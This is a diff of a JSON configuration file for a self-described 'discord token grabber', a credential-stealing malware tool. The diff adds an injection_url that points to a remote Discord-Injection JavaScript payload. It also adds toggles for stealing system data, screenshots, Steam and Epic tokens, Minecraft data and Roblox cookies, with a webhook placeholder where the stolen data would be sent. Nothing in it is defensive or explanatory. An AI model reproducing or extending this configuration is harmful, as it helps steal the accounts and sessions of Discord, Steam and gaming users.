@@ -1,13 +1,16 @@
 {
+    // discord token grabber settings
+
     "webhook": "WEBHOOK HERE",
     "discord_id": "ENTER YOUR DISCORD ID",
     "server_id": "ENTER YOUR SERVER ID",
-    
-    "grab_webcam": "false", 
-    "grab_screenhot": "false",
-    "grab_cookies": "false",
+    "injection_url": "https://raw.githubusercontent.com/addi00000/Discord-Injection/master/injection.js",
 
-    "grab_epic": "false",
+    "grab_system": "false", 
+    "grab_screenhot": "false",
+    "grab_steamtoken": "false",
+
+    "grab_epictoken": "false",
     "grab_minecraft": "false",
-    "grab_roblox": "false",
+    "grab_robloxcookie": "false",
 }
